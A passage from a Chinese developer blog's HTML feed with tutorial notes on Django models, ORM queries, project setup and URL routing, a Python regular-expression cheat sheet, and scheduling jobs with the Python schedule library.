Email 合法性的 CharField</span></span><br><span class="line">    Intor = models.TextField()</span><br><span class="line">    <span class="comment"># 长文本类型</span></span><br><span class="line">    Blog = models.URLField()</span><br><span class="line">    <span class="comment"># 自带检查 URL 合法性的 CharField</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -------------------文件上传-----------------</span></span><br><span class="line">    upload = models.FileField(upload_to=<span class="string">'uploads/'</span>)</span><br><span class="line">    <span class="comment"># 文件上传到 MEDIA_ROOT/uploads</span></span><br><span class="line">    <span class="comment"># 这个字段不能设置primary_key和unique选项.在数据库中存储类型是varchar，默认最大长度为100.</span></span><br><span class="line">    upload_s = models.FileField(upload_to=<span class="string">'uploads/%Y/%m/%d/'</span>)</span><br><span class="line">    <span class="comment"># 文件上传到 MEDIA_ROOT/uploads/2019/07/04</span></span><br><span class="line"></span><br><span class="line">    upload_e = models.FilePathField(path=<span class="string">"/home/images"</span>, match=<span class="string">"foo.*"</span>, recursive=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 这个字段的值被限制在系统上某个目录中的所有文件名集合中。有三个参数</span></span><br><span class="line">    <span class="comment"># 　　　　path = '':  该参数必需。上行所说的‘某个目录’的绝对路径。Example: "/home/images".</span></span><br><span class="line">    <span class="comment"># 　　　　match = 'pattern':  可选参数。格式是正则表达式。用来拣选符合匹配正则表达式的文件</span></span><br><span class="line">    <span class="comment"># 　　　　recursive = True / False: 可选参数，默认为False。设定是否递归该目录下所有子目录的所有文件</span></span><br><span class="line"></span><br><span class="line">    add_date = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 设置初次创建的时间</span></span><br><span class="line">    update_date = models.DateTimeField(auto_now=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 设置最后修改的时间</span></span><br></pre></td></tr></table></figure><p>创建数据库一共需要三步：</p><p>修改models.py中模型<br>运行python3 manage.py makemigrations为改动创建迁移记录<br>运行python3 manage.py migrate，将操作同步到数据库。</p><h2 id="数据增删改查"><a href="#数据增删改查" class="headerlink" title="数据增删改查"></a>数据增删改查</h2><p>数据的添加方法：一步到位的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.objects.create(User=<span class="string">'zz'</span>)</span><br></pre></td></tr></table></figure><p>单个赋值的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">datas = data()</span><br><span class="line">datas.User = <span class="string">'陈二狗'</span></span><br><span class="line">datas.save()</span><br></pre></td></tr></table></figure><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><h2 id="常规的有5种方法获取数据，返回都是数据集"><a href="#常规的有5种方法获取数据，返回都是数据集" class="headerlink" title="常规的有5种方法获取数据，返回都是数据集"></a>常规的有5种方法获取数据，返回都是数据集</h2><p>第一种是 data.objects.all()</p><p>这种方法获取的是这张表里面的所有数据</p><p>第二种是 data.objects.get(id=1)</p><p><strong>这个比较坑，不常用，找不到直接异常</strong><br>这种方法必须确保获取的结果只有一个（多个对象会直接异常），没有匹配条件的时候会报异常，获取的条件是id=1</p><p>第三种方法是 data.objects.filter(id=2)</p><p>这种方法是筛选出id=2的数据,括号内还能有多个条件，比如(id=2,gender=’boy’)</p><p>第四种方法是 data.objects.exclude(id=2)</p><p>这种方法是获取到id不等于2的数据</p><p>第五种方法是 data.objects.order_by(name)</p><p>这种方法获取到的结果是按照name进行排序后的结果</p><h4 id="获取单个对象"><a href="#获取单个对象" class="headerlink" title="获取单个对象"></a>获取单个对象</h4><p>第一种方法是 data.objects.first(name=’zeo’)<br>data.objects.last(name=’zeo’)</p><p>这种方法获取到的结果是符合条件的第一个对象，当然还有最后一个对象，使用的是.last(name=’小桃红’)</p><p><strong>注释：这些方法都可迭代使用</strong></p><p>按照日期获取当天数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.utils <span class="keyword">import</span> timezone</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">now = timezone.now()</span><br><span class="line">start = now - timedelta(hours=<span class="number">23</span>,minutes=<span class="number">59</span>,seconds=<span class="number">59</span>)</span><br><span class="line">CurrentDaySubdomain = URL.objects.filter(change_time__gt=start)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> CurrentDaySubdomain:</span><br><span class="line">    print(c.url)</span><br></pre></td></tr></table></figure><p><em><strong>其他按照时间获取数据方法</strong></em></p><p>1、gt：大于某个时间<br>now = datetime.datetime.now()</p><p>start = now – datetime.timedelta(hours=23, minutes=59, seconds=59)<br>a=yourobject.objects .filter(youdatetimcolumn__gt=start)#前一天</p><p>2、gte：大于等于某个时间：<br>a=yourobject.objects .filter(youdatetimcolumn__gte=start)</p><p>3、lt：小于<br>a=yourobject.objects .filter(youdatetimcolumn__lt=start)</p><p>4、lte：小于等于<br>a=yourobject.objects .filter(youdatetimcolumn__lte=start)</p><p>5、range：查询时间段<br>start_date = datetime.date(2005, 1, 1)<br>end_date = datetime.date(2005, 3, 31)<br>Entry.objects.filter(pub_date__range=(start_date, end_date))</p><p>6、year：查询某年<br>Entry.objects.filter(pub_date__year=2005)</p><p>7、month：查询某月<br>Entry.objects.filter(pub_date__month=12)</p><p>8、day：某天<br>Entry.objects.filter(pub_date__day=3)</p><p>9、week_day：星期几<br>Entry.objects.filter(pub_date__week_day=2)</p><p>10、获取今天的日期，日期格式为yyyy-MM-dd</p><p>from django.utils.timezone import now, timedelta<br>date = now().date() + timedelta(days=-1) #昨天<br>date = now().date() + timedelta(days=0) #今天<br>date = now().date() + timedelta(days=1) #明天</p><p><strong>以上方法获取的数据的结果是QuerySet()类型的数据，是一个结果类，想要获取最后的实际结果，需要使用索引获取</strong></p><p>datas = data.objects.filter(id=2).values()[0]<br>这样的结果是一个字典，索引0即是获取values()列表的第一个结果</p><p>当然你也可以使用赋予变量的形式进行获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">datas = data.objects.get(id=<span class="number">1</span>)</span><br><span class="line">u_id = datas.id</span><br><span class="line">u_User = datas.User</span><br><span class="line"></span><br><span class="line">这种方式进行获取数据，这个前提是在只有一个数据的情况下进行</span><br></pre></td></tr></table></figure><p>如果是all()或者其他方法获取较多的数据集时候，也可以这样获取每个结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data_0 = data.objects.all()</span><br><span class="line"><span class="comment"># 这里的结果是一个数据集合，可以循环迭代和使用索引获取值</span></span><br><span class="line">data_1 = data_0[<span class="number">0</span>]</span><br><span class="line">u_id = data_1.id</span><br><span class="line">u_User = data_1.User</span><br><span class="line"><span class="comment"># 通过这样的方式，就可以实现进行单独数据的获取</span></span><br></pre></td></tr></table></figure><p>像这种的集合，如果想要把里面的数据全都打印出来，可以这么处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ret = <span class="string">''</span></span><br><span class="line">data_0 = data.objects.all()</span><br><span class="line"><span class="keyword">for</span> data_1 <span class="keyword">in</span> data_0:</span><br><span class="line">    ret += data_1.id + <span class="string">'|'</span> + data_1.User + <span class="string">'&lt;br&gt;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Django-笔记-创建</title>
      <link href="/2020/02/07/Django-%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA/"/>
      <url>/2020/02/07/Django-%E7%AC%94%E8%AE%B0-%E5%88%9B%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject Your_Project_Name</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Your_Project_Name/ <span class="comment"># 你存放项目的文件夹</span></span><br><span class="line">    manage.py      <span class="comment"># 命令行工具，可以用来启动Django，等等做很多事</span></span><br><span class="line">    Your_Project_Name/ <span class="comment"># 目录是真正的项目文件包裹目录，它的名字是你引用内部文件的包名</span></span><br><span class="line">        __init__.py       <span class="comment"># 定义包的空文件</span></span><br><span class="line">        settings.py       <span class="comment"># 项目的主配置文件</span></span><br><span class="line">        urls.py           <span class="comment"># 路由管理，相当于Flask中自己写的app.route('/')，不过这里统一管理，很方便</span></span><br><span class="line">        wsgi.py           <span class="comment"># 基于WSGI的web服务器进入点，提供底层的网络通信功能</span></span><br></pre></td></tr></table></figure><h2 id="APP模块添加"><a href="#APP模块添加" class="headerlink" title="APP模块添加"></a>APP模块添加</h2><p>比如你的项目下有个登陆功能，暂且把这个登陆的模块名叫做login，这个登陆的应用需要你使用命令生成然后进行配置，首先到你创建项目的文件夹下面，使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py startapp login</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">login/        <span class="comment"># 该登陆模块的文件夹</span></span><br><span class="line">    __init__.py <span class="comment"># 包空文件</span></span><br><span class="line">    admin.py    <span class="comment"># 自动生成强大的后台管理文件</span></span><br><span class="line">    apps.py        <span class="comment"># 具体我不清楚</span></span><br><span class="line">    migrations/ <span class="comment"># 这个文件夹用来操作管理数据库的数据，可以做数据库的迁移之类</span></span><br><span class="line">        __init__.py <span class="comment"># </span></span><br><span class="line">    models.py    <span class="comment"># 用来生成数据库的文件，和Flask中的modules.py一毛一样呢</span></span><br><span class="line">    tests.py    <span class="comment"># 用来做测试代码的文件，啊，真是贴心呢</span></span><br><span class="line">    views.py    <span class="comment"># 就像Flask中的视图函数，不过这里专门分了一个文件让你写视图函数</span></span><br></pre></td></tr></table></figure><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver</span><br><span class="line"><span class="comment"># 启动,默认端口8000</span></span><br><span class="line">python3 manage.py runserver <span class="number">8080</span></span><br><span class="line"><span class="comment"># 启动，使用8080端口</span></span><br><span class="line">python3 manage.py runserver <span class="number">0</span>:<span class="number">8080</span></span><br><span class="line">并且修改文件settings.py</span><br><span class="line">ALLOWED_HOSTS = [<span class="string">'*'</span>,]</span><br><span class="line"><span class="comment"># 启动，监听所有人的访问，即允许所有人访问</span></span><br></pre></td></tr></table></figure><h2 id="路由urls-py"><a href="#路由urls-py" class="headerlink" title="路由urls.py"></a>路由urls.py</h2><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="comment"># 这个path函数的功能比较重要，最下面会说</span></span><br><span class="line"><span class="keyword">from</span> .views <span class="keyword">import</span> index,error</span><br><span class="line"><span class="comment"># 从视图函数文件中导入创建的两个视图函数</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">''</span>, index, name=<span class="string">'index'</span>),</span><br><span class="line">    <span class="comment"># 这里第一个是网址路由，第二个是视图函数，第三个是视图函数指定的名称，可以在任何地方使用这个名称调用这个视图函数</span></span><br><span class="line">    <span class="comment"># 哇塞，真实贴心实用呢</span></span><br><span class="line">    path(<span class="string">'error/'</span>, error, name=<span class="string">'error'</span>)</span><br><span class="line">    <span class="comment"># 这个的url目录就是error啦</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>使用静态文件<br>然后再根目录下面的settings.py中，</p><p>在底部添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="string">'/static/'</span></span><br><span class="line">STATICFILES_DIRS = (</span><br><span class="line">    os.path.join(os.path.join(BASE_DIR, <span class="string">'static'</span>)),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>设置html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="comment">#这句添加在html文件的最上面  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在需要的地方按照这个格式进行调用，如：</span></span><br><span class="line">&lt;img src=<span class="string">"&#123;% static 'image/404.jpg' %&#125;"</span>/&gt;</span><br></pre></td></tr></table></figure><blockquote><p>这里是引用z</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PATH函数功能</span><br><span class="line">path() 参数： route</span><br><span class="line">route 是一个匹配 URL 的准则（类似正则表达式）。当 Django 响应一个请求时，它会从 urlpatterns 的第一项开始，按顺序依次匹配列表中的项，直到找到匹配的项。</span><br><span class="line"></span><br><span class="line">这些准则不会匹配 GET 和 POST 参数或域名。例如，URLconf 在处理请求 https:<span class="comment">//www.example.com/myapp/ 时，它会尝试匹配 myapp/ 。处理请求 https://www.example.com/myapp/?page=3 时，也只会尝试匹配 myapp/。</span></span><br><span class="line"></span><br><span class="line">path() 参数： view</span><br><span class="line">当 Django 找到了一个匹配的准则，就会调用这个特定的视图函数，并传入一个 HttpRequest 对象作为第一个参数，被“捕获”的参数以关键字参数的形式传入。稍后，我们会给出一个例子。</span><br><span class="line"></span><br><span class="line">path() 参数： kwargs</span><br><span class="line">任意个关键字参数可以作为一个字典传递给目标视图函数。本教程中不会使用这一特性。</span><br><span class="line"></span><br><span class="line">path() 参数： name</span><br><span class="line">为你的 URL 取名能使你在 Django 的任意地方唯一地引用它，尤其是在模板中。这个有用的特性允许你只改一个文件就能全局地修改某个 URL 模式。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 正则表达式</title>
      <link href="/2020/02/07/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/02/07/Python%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Python 正则表达式</p><p>速查</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure><p>匹配次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.         匹配任意字符一次</span><br><span class="line">*         匹配前面的表达式<span class="number">0</span>/n次</span><br><span class="line">+         匹配前面的表达式<span class="number">1</span>/n次</span><br><span class="line">？        匹配前面的表达式<span class="number">0</span>/<span class="number">1</span>次</span><br><span class="line">&#123;m&#125;        匹配前面的表达式m次</span><br><span class="line">&#123;m,n&#125;     匹配前面的表达式m到n次</span><br><span class="line">*？       匹配前面的表达式<span class="number">0</span>次</span><br><span class="line">+？       匹配前面的表达式<span class="number">1</span>次</span><br></pre></td></tr></table></figure><p>常用语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">re.S    匹配所有的字符</span><br><span class="line">re.I    匹配大小写</span><br><span class="line">re.M    多行匹配</span><br><span class="line">re.match从头开始匹配</span><br><span class="line">re.search全文匹配</span><br><span class="line">\d         匹配所有的数字</span><br><span class="line">\D        匹配所有的非数字</span><br><span class="line">\s        匹配所有的文字</span><br><span class="line">\S        匹配所有的非文本</span><br><span class="line">[]        字符集合，匹配里面的所有表达式，使用|分开</span><br></pre></td></tr></table></figure><h2 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h2><p>创建正则表达式对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(pattern[, flags])</span><br></pre></td></tr></table></figure><p>#根据包含正则表达式的字符串创建模式对象<br>全文查找符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search(pattern, string[, flags])    </span><br><span class="line"><span class="comment">#在字符串中查找，只查找一个</span></span><br></pre></td></tr></table></figure><p>从头开始查找符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match(pattern, string[, flags])    </span><br><span class="line"><span class="comment">#在字符串的开始处匹配模式</span></span><br></pre></td></tr></table></figure><p>分割字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">split(pattern, string[, maxsplit=<span class="number">0</span>,flags])    </span><br><span class="line"><span class="comment">#根据模式的匹配项来分割字符串</span></span><br></pre></td></tr></table></figure><p>寻找所有符合表达式的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">findall(pattern, string,flags)    </span><br><span class="line"><span class="comment">#列出字符串中模式的所有匹配项</span></span><br><span class="line"><span class="keyword">return</span> 数组</span><br></pre></td></tr></table></figure><p>替换字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub(pat,repl, string[,count=<span class="number">0</span>,flags])    </span><br><span class="line"><span class="comment">#将字符串中所有的pat的匹配项用repl替换</span></span><br></pre></td></tr></table></figure><p>注意 表 示 字 符 串 的 结 尾 ， 所 以 加 上 表示字符串的结尾，所以加上 表示字符串的结尾，所以加上表示匹配的内容必须在字符串的结尾<br>匹配整个字符串还要加上字符串开始标记^</p><p>注意写爬出的时候可以用正则表达式匹配多个对象，然后遍历的时候使用yield生成器，可以组合成字典的形式，然后把字典给json.dumps()转换成json的格式，最后保存在本地文本中。</p><h2 id="常规匹配的正则语法"><a href="#常规匹配的正则语法" class="headerlink" title="常规匹配的正则语法"></a>常规匹配的正则语法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">汉字：[\u4e00-\u9fa5]&#123;<span class="number">0</span>,&#125;</span><br><span class="line">英文和数字：[A-Za-z0<span class="number">-9</span>]+</span><br><span class="line">长度为<span class="number">3</span><span class="number">-20</span>的所有字符：.&#123;<span class="number">3</span>,<span class="number">20</span>&#125;</span><br><span class="line">Email地址：\w+([-+.]\w+)@\w+([-.]\w+).\w+([-.]\w+)*</span><br><span class="line">域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?</span><br><span class="line">InternetURL：[a-zA-z]+://[^\s] 或 ^http://([\w-]+.)+[\w-]+(/[\w-./?%&amp;=])?$</span><br><span class="line">手机号码：^(<span class="number">13</span>[<span class="number">0</span><span class="number">-9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15</span>[<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18</span>[<span class="number">0</span>|<span class="number">1</span>|<span class="number">2</span>|<span class="number">3</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$</span><br><span class="line">国内电话号码：\d&#123;<span class="number">3</span>&#125;-\d&#123;<span class="number">8</span>&#125;|\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">7</span>&#125;(<span class="number">0511</span><span class="number">-4405222</span>、<span class="number">021</span><span class="number">-87888822</span>)</span><br><span class="line">日期格式：^\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;-\d&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line">空白行的正则表达式：\n\s*\r (可以用来删除空白行)</span><br><span class="line">腾讯QQ号：[<span class="number">1</span><span class="number">-9</span>][<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">4</span>,&#125;</span><br><span class="line">IP地址提取：\d+.\d+.\d+.\d+</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python执行定时任务</title>
      <link href="/2020/02/07/Python%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2020/02/07/Python%E6%89%A7%E8%A1%8C%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="Python执行定时任务"><a href="#Python执行定时任务" class="headerlink" title="Python执行定时任务"></a>Python执行定时任务</h2><p>python使用内置库和第三方库执行定时任务。</p><h3 id="使用-sched-模块"><a href="#使用-sched-模块" class="headerlink" title="使用 sched 模块"></a>使用 sched 模块</h3><p>sched相当于一个延时处理任务<br>schedule是简单明了的一个第三方定时任务库，需要先pip安装一下<br>一个很好的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义你要周期运行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"I'm working..."</span>)</span><br><span class="line"></span><br><span class="line">schedule.every(<span class="number">10</span>).minutes.do(job)               <span class="comment"># 每隔 10 分钟运行一次 job 函数</span></span><br><span class="line">schedule.every().hour.do(job)                    <span class="comment"># 每隔 1 小时运行一次 job 函数</span></span><br><span class="line">schedule.every().day.at(<span class="string">"10:30"</span>).do(job)         <span class="comment"># 每天在 10:30 时间点运行 job 函数</span></span><br><span class="line">schedule.every().monday.do(job)                  <span class="comment"># 每周一 运行一次 job 函数</span></span><br><span class="line">schedule.every().wednesday.at(<span class="string">"13:15"</span>).do(job)   <span class="comment"># 每周三 13：15 时间点运行 job 函数</span></span><br><span class="line">schedule.every().minute.at(<span class="string">":17"</span>).do(job)        <span class="comment"># 每分钟的 17 秒时间点运行 job 函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    schedule.run_pending()   <span class="comment"># 运行所有可以运行的任务</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义你要周期运行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(msg)</span>:</span></span><br><span class="line">    print(<span class="string">"I'm working..."</span>)</span><br><span class="line">    print(<span class="string">'接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"></span><br><span class="line">schedule.every(<span class="number">10</span>).seconds.do(job,msg=<span class="string">'10s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    schedule.run_pending()   <span class="comment"># 运行所有可以运行的任务</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="执行并发任务"><a href="#执行并发任务" class="headerlink" title="执行并发任务"></a>执行并发任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> schedule,time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'任务1接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'任务2接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job3</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'任务3接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line">schedule.every(<span class="number">1</span>).seconds.do(job1,msg=<span class="string">'任务1'</span>)</span><br><span class="line">schedule.every(<span class="number">3</span>).seconds.do(job2,msg=<span class="string">'任务2'</span>)</span><br><span class="line">schedule.every(<span class="number">1</span>).seconds.do(job3,msg=<span class="string">'任务3'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    schedule.run_pending()</span><br></pre></td></tr></table></figure><p>实际上应该是顺序执行<br><img src="https://img-blog.csdnimg.cn/20200207104831217.png" alt="在这里插入图片描述"></p><p>加入使用threading完成并发<br><img src="https://img-blog.csdnimg.cn/20200207104939256.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 